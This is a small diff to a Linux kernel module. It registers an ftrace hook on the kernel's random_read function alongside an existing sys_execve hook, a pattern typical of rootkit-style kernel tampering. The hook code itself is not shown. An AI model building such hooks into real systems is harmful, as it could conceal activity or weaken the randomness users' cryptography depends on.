@@ -3,6 +3,7 @@
 #include <linux/module.h>
 #include <linux/init.h>
 #include "hooks/execve.h"
+#include "hooks/chrandom.h"
 #include "hooks/hook_installer.h"
 
 MODULE_LICENSE("GPL");
@@ -14,6 +15,7 @@ MODULE_VERSION("0.01a");
 
 static struct ftrace_hook hooks[] = {
     CRT_HOOK("sys_execve", sys_execve_hook, &sys_execve_target),
+    CRT_HOOK("random_read", random_read_hook, &random_read_target)
 };
 
 static int __init chainit(void)
